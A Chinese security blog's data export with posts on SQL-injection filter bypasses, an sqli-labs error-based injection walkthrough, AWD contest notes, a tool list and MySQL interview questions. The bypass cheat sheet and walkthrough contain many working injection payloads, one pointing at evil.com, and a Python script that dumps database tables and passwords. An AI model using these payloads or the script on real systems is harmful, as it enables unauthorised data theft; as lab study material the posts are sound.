{"meta":{"title":"小胡不甘平凡","subtitle":"","description":"","author":"小胡","url":"http://xiaohublog.cn","root":"/"},"pages":[{"title":"分类","date":"2021-01-22T03:58:53.000Z","updated":"2021-01-24T15:42:17.144Z","comments":true,"path":"categories/index.html","permalink":"http://xiaohublog.cn/categories/index.html","excerpt":"","text":""},{"title":"bb","date":"2021-01-22T03:59:00.000Z","updated":"2021-01-22T04:00:04.835Z","comments":true,"path":"bb/index.html","permalink":"http://xiaohublog.cn/bb/index.html","excerpt":"","text":""},{"title":"留言板","date":"2021-01-22T03:59:07.000Z","updated":"2021-01-24T15:45:18.045Z","comments":true,"path":"guestbook/index.html","permalink":"http://xiaohublog.cn/guestbook/index.html","excerpt":"","text":""},{"title":"友链","date":"2021-01-22T03:59:03.000Z","updated":"2021-01-24T15:45:34.392Z","comments":true,"path":"links/index.html","permalink":"http://xiaohublog.cn/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-01-22T03:58:57.000Z","updated":"2021-01-24T15:42:36.138Z","comments":true,"path":"tags/index.html","permalink":"http://xiaohublog.cn/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"SQL注入绕过知识汇总","slug":"SQL注入绕过姿势","date":"2021-12-11T10:10:01.000Z","updated":"2021-12-12T15:21:56.176Z","comments":true,"path":"2021/12/11/SQL注入绕过姿势/","link":"","permalink":"http://xiaohublog.cn/2021/12/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/","excerpt":"","text":"前言学习SQL注入也有很长一段时间了，在实战中，往往最难的不是SQL注入的使用方法，而是应该怎么绕过针对于防止SQL注入攻击的过滤，于是想总结一下一些比较常见的SQL注入的绕过方式。 1.大小写绕过如果网站没有对大小写都进行过滤的话，可以尝试进行大小写绕过。 1?id&#x3D;1 UnIon SeLeCt user()--+ 2.双写绕过有一些网站会将SQL关键字进行替换操作，在出现SQL关键字（比如select,union等）时，将其替换为空，这时候就可以进行双写绕过。 1?id&#x3D;1 ununionion seselectlect user()--+ 3.常用注释符进行绕过12345678&#x2F;&#x2F;--%20&#x2F;**&#x2F;#--+-- -%00; 4.编码绕过可以利用urlencode，ascii(char)，hex，unicode等编码来进行绕过 123456789101112131415161718192021222324252627or 1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。十六进制编码SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))双重编码绕过?id&#x3D;1%252f%252a*&#x2F;UNION%252f%252a &#x2F;SELECT%252f%252a*&#x2F;1,2,password%252f%252a*&#x2F;FROM%252f%252a*&#x2F;Users--+一些unicode编码举例： 单引号：&#39;%u0027 %u02b9 %u02bc%u02c8 %u2032%uff07 %c0%27%c0%a7 %e0%80%a7空白：%u0020 %uff00%c0%20 %c0%a0 %e0%80%a0左括号(:%u0028 %uff08%c0%28 %c0%a8%e0%80%a8右括号):%u0029 %uff09%c0%29 %c0%a9%e0%80%a9 5.绕过空格两个空格可以代替一个空格，用Tab代替空格，%a0=空格 1%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F; &#x2F;*!*&#x2F; 如果只对空格进行过滤，没有对括号进行过滤，可以使用括号绕过空格。 1select(user())from dual where(1&#x3D;1)and(2&#x3D;2) 这种方法常用于基于时间的盲注 1？id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23 6.引号绕过（使用十六进制）一般会用到引号的地方是在最后的where子句中。如下面的一条sql语句，这条语句就是简单的用来查询user表中所有字段的语句。 1select column_name from information_schema.tables where table_name&#x3D;&quot;users&quot; 如果这个时候引号被过滤了，那么上面的语句就无法正常执行，遇到这种情况可以使用十六进制来解决问题。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了： 1select column_name from information_schema.tables where table_name&#x3D;0x7573657273 7.逗号绕过在使用盲注的时候，很多都要使用到substr(),mid(),limit。这些函数都需要配合逗号使用，在遇到对逗号进行过滤的情况下，可以使用from to进行绕过。 12select substr(database() from 1 for 1);select mid(database() from 1 for 1); 使用join 12union select 1,2 #等价于union select * from (select 1)a join (select 2)b 使用like 12select ascii(mid(user(),1,1))&#x3D;80 #等价于select user() like &#39;r%&#39; 使用limit可以用offset进行绕过 12select * from news limit 0,1 #等价于select * from news limit 1 offset 0 8.比较符号绕过sqlmap经常使用&gt;&lt;，使用between的脚本。可以使用greatest()，least()，进行绕过，如果在使用ascii码二分法对数据库进行拆解时无法使用比较符号，就可以使用以上两个函数进行绕过。 常见的一个盲注sql语句 12select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64 如果此时比较操作符被过滤，上面的盲注语句则无法生效，我没可以通过greatest()函数来进行绕过。 1select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64 9.or and xor not绕过1and&#x3D;&amp;&amp; or&#x3D;|| xor&#x3D;| not&#x3D;! 9.=绕过使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;，或者以下语句 1使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt; 10.等价函数绕过12345678910111213141516171819hex()、bin() &#x3D;&#x3D;&gt; ascii()sleep() &#x3D;&#x3D;&gt;benchmark()concat_ws()&#x3D;&#x3D;&gt;group_concat()mid()、substr() &#x3D;&#x3D;&gt; substring()@@user &#x3D;&#x3D;&gt; user()@@datadir &#x3D;&#x3D;&gt; datadir()举例：substring()和substr()无法使用时：?id&#x3D;1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))&#x3D;74 或者：substr((select &#39;password&#39;),1,1) &#x3D; 0x70strcmp(left(&#39;password&#39;,1), 0x69) &#x3D; 1strcmp(left(&#39;password&#39;,1), 0x70) &#x3D; 0strcmp(left(&#39;password&#39;,1), 0x71) &#x3D; -1 11.等价语句123456789101112select &#x3D;&#x3D;&gt; show#HANDLER语法HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT … ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT … ]HANDLER tbl_name CLOSE#set语法mysql&gt; set @varA &#x3D; 3, @varB &#x3D; @varA;mysql&gt; select @varB; 12.宽字节注入过滤 ’ 的时候往往利用的思路是将 ’ 转换为 ’ 。在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：（1）%df 吃掉 \\ 具体的方法是 urlencode(’) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面： 1id&#x3D;-1%df%27union select 1,user(),3--+ （2）将 ’ 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。一般产生宽字节注入的PHP函数：1.replace（）：过滤 ’ \\ ，将 ’ 转化为 ’ ，将 \\ 转为 \\，将 “ 转为 “ 。用思路一。2.addslaches()：返回在预定义字符之前添加反斜杠（\\）的字符串。预定义字符：’ , “ , \\ 。用思路一（防御此漏洞，要将 mysql_query 设置为 binary 的方式）3.mysql_real_escape_string()：转义下列字符： 1id&#x3D;-1%df%27union select 1,user(),3--+ 13.多参数请求拆分对于多个参数拼接到同一条sql语句中的情况，可以将sql语句分割插入 1a&#x3D;[input1]&amp;b&#x3D;[input2] 将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示: 1and a&#x3D;[input1] and b&#x3D;[input2] 这个时候就可以进行拼接，如下所示： 1a&#x3D;union&#x2F;*&amp;b&#x3D;*&#x2F;select 1,2,3,4 最终得到的sql语句如下所示： 1and a&#x3D;union &#x2F;*and b&#x3D;*&#x2F;select 1,2,3,4 14.生僻函数1234567891011MySQL&#x2F;PostgreSQL支持XML函数：Select UpdateXML(‘&lt;script x&#x3D;_&gt;&lt;&#x2F;script&gt; ’,’&#x2F;script&#x2F;@x&#x2F;’,’src&#x3D;&#x2F;&#x2F;evil.com’); ?id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))SELECT xmlelement(name img,xmlattributes(1as src,&#39;a\\l\\x65rt(1)&#39;as \\117n\\x65rror)); &#x2F;&#x2F;postgresql?id&#x3D;1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));and 1&#x3D;(updatexml(1,concat(0x5c,(select user()),0x5c),1))and extractvalue(1, concat(0x5c, (select user()),0x5c)) 15.反引号绕过1select &#96;version()&#96;，可以用来过空格和正则，特殊情况下还可以将其做注释符用 16. \\N绕过\\N相当于NULL字符 123select * from users where id&#x3D;8E0union select 1,2,3,4,5,6,7,8,9,0select * from users where id&#x3D;8.0union select 1,2,3,4,5,6,7,8,9,0select * from users where id&#x3D;\\Nunion select 1,2,3,4,5,6,7,8,9,0 17.php中常见的waf及绕过php过滤直接用preg_match(&#39;/(&#39;.waf.&#39;)/i&#39;,$id) 过滤and or123waf &#x3D; &#39;and|or&#39;过滤代码 1 or 1&#x3D;1 1 and 1&#x3D;1绕过方式 1 || 1&#x3D;1 1 &amp;&amp; 1&#x3D;1 过滤union123waf &#x3D; &#39;and|or|union&#39;过滤代码 union select user,password from users绕过方式 1 &amp;&amp; (select user from users where userid&#x3D;1)&#x3D;&#39;admin&#39; 过滤where123waf &#x3D; &#39;and|or|union|where&#39;过滤代码 1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;绕过方式 1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39; 过滤limit123waf &#x3D; &#39;and|or|union|where|limit&#39;过滤代码 1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;#user_id聚合中user_id为1的user为admin 过滤group by123waf &#x3D; &#39;and|or|union|where|limit|group by&#39;过滤代码 1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) &#x3D; 1 过滤select123waf &#x3D; &#39;and|or|union|where|limit|group by|select&#39;过滤代码 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) &#x3D; 1绕过方式 1 &amp;&amp; substr(user,1,1) &#x3D; &#39;a&#39; 过滤’(单引号)123waf &#x3D; &#39;and|or|union|where|limit|group by|select|\\&#39;&#39;过滤代码 1 &amp;&amp; substr(user,1,1) &#x3D; &#39;a&#39;绕过方式 1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) &#x3D; 0x61 1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61) 过滤hex123waf &#x3D; &#39;and|or|union|where|limit|group by|select|\\&#39;|hex&#39;过滤代码 1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)绕过方式 1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。 过滤substr123waf &#x3D; &#39;and|or|union|where|limit|group by|select|\\&#39;|hex|substr&#39;过滤代码 1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16)) 绕过方式 1 &amp;&amp; lpad(user(),1,1) in &#39;r&#39; 18.更改注入参数传参方式如果在代码中使用$_REQUEST获取参数，而$_REQUEST会依次从GET/POST/cookie中获取参数，如果WAF只检测了GET/POST而没有检测cookie,则可以将注入语句放入cookie中进行绕过。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://xiaohublog.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"sql注入","slug":"sql注入","permalink":"http://xiaohublog.cn/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"绕过","slug":"绕过","permalink":"http://xiaohublog.cn/tags/%E7%BB%95%E8%BF%87/"}]},{"title":"sqli-labs第五关二次注入","slug":"二次注入sql-labs 第五关","date":"2021-11-29T10:10:01.000Z","updated":"2021-12-12T15:23:35.289Z","comments":true,"path":"2021/11/29/二次注入sql-labs 第五关/","link":"","permalink":"http://xiaohublog.cn/2021/11/29/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5sql-labs%20%E7%AC%AC%E4%BA%94%E5%85%B3/","excerpt":"","text":"sqli-labs第五关解题思路及拓展,这一关的解题思路有很多种，也算是比较有意思的一关。话不多说，直接开始进行解题。 首先测试是什么类型的注入 通过页面回显可以知道是字符型的注入，并且是使用单引号进行闭合。 使用order by测试字段数量 使用union联合查询，发现没有回显信息，在没有回显的情况下，可以选择的是盲注，报错注入，二次注入。由于之前并没有接触过二次注入，所以想学习一下二次注入并解决这道题目，为了方面调试，在主页面中将sql语句输出。 什么是二次注入就是sql查询的嵌套使用方法，在一个select中嵌套使用一个select，如下所示： 1select concat((select database()),floor(rand()*2)); 这里rand()函数是随机生成一个小于0的正数，floor()是进行取整的操作，所以floor（rand()*2）是生成一个1或0的数值，再将该数值与select database()得到的值进行拼接。在本地数据库中进行测试： 对这些基础函数有了理解之后，就可以进行二次注入了，首先在本地进行测试 1select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.schemata group by a; 可以看出当我们多次进行查询的时候，数据库竟然报错了，将数据库名security1爆出来了。 运用此方法对第五关进行sql注入,爆出数据库名 12http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39;union SELECT null,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a%23 使用以下语句爆表名 12http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union SELECT null,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;),floor(rand()*2))as a from information_schema.tables group by a%23 在爆表名时，出了一个问题，这里多了一个键，键1已经存在虚拟表中，由于键只能唯一，所以此时就会报错。所以在使用floor()、rand(0)、count()、group by时，数据表中至少要有3条记录才会报错，所以我们在第二条select语句末尾加上limit x,1即可让它报错继续注入,省略x=0,1,2的情况，方法一样，在x=3时找到我们需要的表。 123http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union SELECT null,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 3,1),floor(rand()*2))as a from information_schema.tables group by a%23 爆列名 1234http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union SELECT null,count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23 爆字段 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union SELECT null,count(*),concat((select password from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23 至此，二次注入完成，值得注意的是，有时候第二次执行也未必有结果，可以尝试多执行几次。 最后贴上大佬的exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsfrom bs4 import BeautifulSoupdb_name = &#x27;&#x27;table_list = []column_list = []url = &#x27;&#x27;&#x27;http://192.168.1.113:86/Less-5/?id=1&#x27;&#x27;&#x27;### 获取当前数据库名 ###print(&#x27;当前数据库名:&#x27;)payload = &#x27;&#x27;&#x27;&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27;r = requests.get(url+payload)db_name = r.text.split(&#x27;:&#x27;)[-2]print(&#x27;[+]&#x27; + db_name)### 获取表名 ###print(&#x27;数据库%s下的表名:&#x27; % db_name)for i in range(50): payload = &#x27;&#x27;&#x27;&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27; % (db_name,i) r = requests.get(url+payload) if &#x27;group_key&#x27; not in r.text: break table_name = r.text.split(&#x27;:&#x27;)[-2] table_list.append(table_name) print(&#x27;[+]&#x27; + table_name)### 获取列名 ####### 这里以users表为例 ####print(&#x27;%s表下的列名:&#x27; % table_list[-1])for i in range(50): payload = &#x27;&#x27;&#x27;&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27; % (table_list[-1],i) r = requests.get(url + payload) if &#x27;group_key&#x27; not in r.text: break column_name = r.text.split(&#x27;:&#x27;)[-2] column_list.append(column_name) print(&#x27;[+]&#x27; + column_name)### 获取字段值 ####### 这里以username列为例 ####print(&#x27;%s列下的字段值:&#x27; % column_list[-2])for i in range(50): payload = &#x27;&#x27;&#x27;&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27; % (column_list[-2],db_name,table_list[-1],i) r = requests.get(url + payload) if &#x27;group_key&#x27; not in r.text: break dump = r.text.split(&#x27;:&#x27;)[-2] print(&#x27;[+]&#x27; + dump)","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://xiaohublog.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"sql注入","slug":"sql注入","permalink":"http://xiaohublog.cn/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"sql-labs","slug":"sql-labs","permalink":"http://xiaohublog.cn/tags/sql-labs/"}]},{"title":"AWD赛前学习笔记","slug":"AWD赛前学习笔记","date":"2021-11-15T10:10:01.000Z","updated":"2021-12-01T13:23:24.294Z","comments":true,"path":"2021/11/15/AWD赛前学习笔记/","link":"","permalink":"http://xiaohublog.cn/2021/11/15/AWD%E8%B5%9B%E5%89%8D%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"最近有幸跟着大佬进了强网杯的线下决赛，通过赛前的了解，整场比赛分为上午的运维赛和下午的AWD。作为一枚小菜鸡，之前肯定是没有打过AWD的，所以针对下午的AWD进行了一些赛前的学习。 防御-备份 123456#打包目录tar -zcvf archive_name.tar.gz directory_to_compress#解包tar -zxvf archive_name.tar.gz#scp拖到本地或者使用ssh连接工具拖拽scp -P 端口 ctf@192.168.1.3:&#x2F;var&#x2F;www&#x2F;html&#x2F;c0de.tar .&#x2F; 1234567891011#备份指定的多个数据库mysqldump -u root --database choose test &gt;&#x2F;tmp&#x2F;db.sql#恢复备份source FILE_PATH#遇到一个备份有问题可以执行以下操作mysqldump -u root --all-databases --skip-lock-tables &gt;&#x2F;tmp&#x2F;db.sql#重置mysql密码#方法1:用SET PASSWORD命令mysql&gt; set password for 用户名@localhost &#x3D; password(&#39;新密码&#39;)#方法2:用mysqladminmysqladmin -u用户名 -p旧密码 password 新密码 12#下载到本地scp -P ssh_port ctf@host_ip:&#x2F;tmp&#x2F;bak.sql local_file 主机发现 使用nmap对C段或端口进行扫描 知道IP地址扫端口 1.\\nmap 10.241.180.159 -p1-65535 扫C段 12.\\nmap 10.241.180.159&#x2F;24nmap –sn 192.168.71.0&#x2F;24 根据ip列表扫，有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机 1nmap -iL ip.txt 防御-基础防护 寻找最近20分钟内修改过的文件（已经开始一段时间之后） 1find &#x2F;var&#x2F;www&#x2F;html -name *.php -mmin -20 拿到源码之后使用D盾查杀，检测预留后门 Seay源代码审计系统 检查系统安全性 关闭无需开放的端口、检查端口以及服务弱口令，mysql默认密码等，是否做了ssh登录限制（脚本） 修改权限（比如上传目录是否可执行的权限） 1chmod X- 关键字查杀（查找敏感函数） 123find . -name &#39;*.php&#39; |xargs grep -n &#39;eval(&#39;find . -name &#39;*.php&#39; |xargs grep -n &#39;assem(&#39;find . -name &#39;*.php&#39; |xargs grep -n &#39;system(&#39; 防御-文件监控自备文件监控脚本（python、shell、php）可以实时监控站点目录是否遭到可以篡改，或者被挂马。 攻击-权限维持 拿到webshell之后，因为简单的webshell容易被清理，所以势必要进行权限维持，从而不断得分，优先考虑不死码（重要），反弹shell等方式维持权限，后续再进行提权，批量getshell。 技巧总结： 现场做代码审计不太现实，日志是发现web漏洞的主要手段，WAF要上（如果有限制不能使用通用防御工具的华可以不拦截，只记录）。 日志分析程序，重放别人的payload。 PWN尽量尝试，一般不会很难。 很可能有NPC木马，要利用好，不能删除的话可以进行修改。 木马通常需要加密，防止被其他队伍检测流量进行利用。 常用命令12345678910111213141516171819202122232425ssh &lt;-p 端口&gt; 用户名@IPscp 文件路径 用户名@IP:存放路径tar -zcvf web.tar.gz &#x2F;var&#x2F;www&#x2F;htmlpkill -kill -t &lt;用户tty&gt;ps aux | grep pid或者进程名#查看已建立的网络连接及进程netstat -antlp | grep EST#查看指定端口被哪个进程占用lsof -i:端口号 或者 netstat -tunlp|grepkill PIDkill - &lt;进程名&gt;kill - &lt;PID&gt;#备份数据库mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql#还原数据库mysqldump --all-databases &gt;bak.sqlfind &#x2F; *.php -permawk -F: &#x2F;etc&#x2F;passwdcrontab -l#检测所有的tcp连接数量及状态netstat -ant|awk |grep |sed -e -e |sort|uniq -c |sort -rn#查看页面访问前十的IPcat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log | cut -f1 -d |sort |uniq -c |sort -k -r | head -#查看页面访问排名前十的URLcat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log | cut -f1 -d |sort |uniq -c |sort -k -r | head - linux修改ssh即本地密码passwd 修改后台登录密码 1234567mysql -u root -pshow databases；use test;show tables;select * from admin;updata admin set user pass&#x3D;’123456’; &#x2F;&#x2F;updata 表名 set 字段名 &#x3D; ‘值’;flush privileges; 修改mysql登录密码方法一： 123mysql&gt;set password for root@localhost&#x3D;password(‘ocean888’); config.php文件中是有数据库的连接信息，执行完上条命令后更改 此文件方法二： 123mysqladmin -uroot -p 123456 password 123root&#x3D;用户名； 123456&#x3D;旧密码； 123&#x3D;新密码； WAF脚本部署 挂waf： 每个文件前边加 require_once(waf.php); 改 .user.ini配置文件 auto_prepend_file=; 包含在文件头auto_append_file=; 包含在文件尾 注：如果挂了waf出现持续扣分，waf去掉 文件监控脚本部署注意：现上好waf再上文件监控靶机没有python的话要先安python（视情况而定）","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://xiaohublog.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"sql注入","slug":"sql注入","permalink":"http://xiaohublog.cn/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"绕过","slug":"绕过","permalink":"http://xiaohublog.cn/tags/%E7%BB%95%E8%BF%87/"}]},{"title":"信息收集网站工具总结","slug":"信息收集网站工具","date":"2021-07-22T14:10:01.000Z","updated":"2021-07-26T15:46:06.481Z","comments":true,"path":"2021/07/22/信息收集网站工具/","link":"","permalink":"http://xiaohublog.cn/2021/07/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99%E5%B7%A5%E5%85%B7/","excerpt":"","text":"信息收集子域名查询Layer子域名挖掘机Site百度语法crt.shhttps://ruo.me/https://tool.chinaz.com/https://securitytrails.com/domainteemo子域名收集：https://github.com/bit4woo/teemo 在线CMS识别：http://whatweb.bugscaner.com/look/通过特殊文件MD5值得到相应CMS cdn绕过CDN历史记录：x.threatbook.cn历史cdn解析记录：https://securitytrails.com/domain/www.baidu.com/history/a子域名查询工具：https://seuritytrails.com/list/apex_domain/caredaily.com查网址cdn ：dnsdb.io查网址cdn，子域名：crt.shGOBUSTER - 目录/文件和DNS爆破工具：https://github.com/OJ/gobuster IP信息Shodan：https://www.shodan.io/zoomeye ：https://www.zoomeye.org/fofa ：https://fofa.so/扫描网站：https://www.webscan.cc/超级ping ：http://ping.chinaz.com/第三方查真实ip ：get-site-ip.com国外ping（找真实IP）：tools.ipip.net/cdn.php WAF探测Wafw00f gps定位IPopengps.cnhttps://www.ipplus360.com/search/iphttps://www.chaipip.com/----有丶准 WEB漏洞XSS漏洞xsssh.cn xss自定义发包工具：postmanbeef SQL注入sqlmap 目录遍历漏洞7kWebPathBrute 文件上传漏洞文件读取漏洞WebShell各种后门代码：github.com/tennc/webshell XXExxeinjector 加密解密cmd5.comsomd5.com查询带salt密文时：使用 密文:盐 的格式进行查询JWT：jwt.io 口令爆破字典github.com/huyuanzhi2/password_brute_dictionary字典文件：https://github.com/TheKingOfDuck/fuzzDicts 其他工具server酱微信推送：sc.ftqq.com忍者安全测试系统kalitg 漏洞平台exploit-db：https://www.exploit-db.com/1337today：https://fr.0day.today/seebug：https://www.seebug.org/cnvd：https://www.cnvd.org.cn/ 靶场平台补天src平台：www.butian.net墨者学院：https://www.mozhe.cn漏洞盒子：https://www.vulbox.com/攻防世界：https://adworld.xctf.org.cn/i春秋：https://www.ichunqiu.com/buuctf：https://buuoj.cn/ CTFHUB：https://ctf.bugku.com/challengespikachu、dvwa、webgoatsql注入靶场：sqlilabs线上sql靶场：https://redtiger.labs.overthewire.org/文件上传（包含）靶场：uploadlabsXSS漏洞靶场：xsslabsXXE漏洞靶场：xxelabs中间件靶场：vulhub更加真实靶场：vulnhubjava反序列化靶场：webgoat 社区hei客街：https://www.hackjie.com/圈子：https://www.secquan.org/Login?jump=aHR0cHM6Ly93d3cuc2VjcXVhbi5vcmc=freebuf看雪先知社区","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"安全","slug":"安全","permalink":"http://xiaohublog.cn/tags/%E5%AE%89%E5%85%A8/"},{"name":"信息收集","slug":"信息收集","permalink":"http://xiaohublog.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"Mysql常见面试题","slug":"Mysql面试题","date":"2021-03-25T02:10:01.000Z","updated":"2021-04-03T13:58:27.627Z","comments":true,"path":"2021/03/25/Mysql面试题/","link":"","permalink":"http://xiaohublog.cn/2021/03/25/Mysql%E9%9D%A2%E8%AF%95%E9%A2%98/","excerpt":"","text":"MySQL面试题（未完结）索引相关1、什么是索引 索引是一种数据结构，可以帮助我们快速的进行数据查找。 2、索引是什么样的数据结构 索引的数据结构和具体存储引擎的实现有关，在MYSQL中使用较多的索引有Hash索引，B+树索引等，而我们经常使用的InnoDB存储引擎的默认索引实现为B+书索引。 3、Hash索引和B+树有什么区别 首先要知道Hash索引和B+数索引的底层原理： hash索引底层就是hash表，进行查找时，调用一次函数就可以获取到相应的键值，之后进行回表查询获得实际数据。B+树底层实现是多路平衡查找树，对于每一次的查询都是从根节点出发，查找到叶子节点方可获得所查键值，然后根据查询判断是否需要回表查询数据。 区别： hash索引进行等值查询更快（一般情况），但是却无法进行范围查询 hash索引不支持使用索引进行排序。 hash索引不支持模糊查询以及多列索引的最左前缀匹配，原理也是因为hash函数的不可预测性。 hash索引任何时候都避免不了回表查询数据，而B+树在符合某些条件（聚簇索引，覆盖索引等）的时候可以只通过索引完成查询。 hash索引虽然在等值查询上较快，但是不稳定，性能不可预测，当某个键值存在大量重复的时候，发生hash碰撞，此时效率可能极差。而B+数的查询效率比较稳定，对于所有的查询都是根节点到叶子节点，且树的高度较低。 因此，在大多数情况下，直接选择B+树索引可以获得稳定且较好的查询速度，而不需要使用hash索引。 4、myisam和Innodb的区别 myisam引擎是5.1版本之前的默认引擎，支持全文检索、压缩、空间函数等，但是不支持事务和行级锁，所以一般用于有大量查询少量插入的场景来使用，而且myisam不支持外键，并且索引和数据是分开存储的。 innodb是基于聚簇索引建立的，和myisam相反，它支持事务，外键，并且通过MVCC来支持高并发，索引和数据存储在一起。 5、聚簇和非聚簇索引是什么 在B+树的索引中，叶子节点可能存储了key值，也可能存储了当前的key值以及整行的数据，这就是聚簇索引。在InnoDB中，只有主键索引是聚簇索引，如果没有主键，则挑选一个唯一键建立聚簇索引，如果没有唯一键，则隐式的生成一个键来建立聚簇索引。 当查询使用聚簇索引时，在对应的叶子节点，可以获取到整行数据，因此不用再次进行回表查询。 6、覆盖索引和回表 覆盖索引指的是在一次查询中，如果一个索引包含或者说覆盖所有需要查询的字段的值，我们就称之为覆盖索引，而不再需要回表查询。 7、非聚簇索引一定会回表查询吗 不一定，这涉及到查询语句所要求的字段是否全部命中了索引，如果全部命中了索引，那么就不必回表查询。 8、建立索引需要考虑哪些因素 建立索引的时候一般要考虑到字段的使用频率，经常作为条件查询的字段比较合适，如果需要建立联合索引的话，还需要考虑联合索引中的顺序，此外也要考虑其他方面，比如防止过多的所有对表造成太大的压力，这些都和实际的表结构以及查询方式有关。 9、联合索引是什么，为什么需要注意联合索引中的顺序 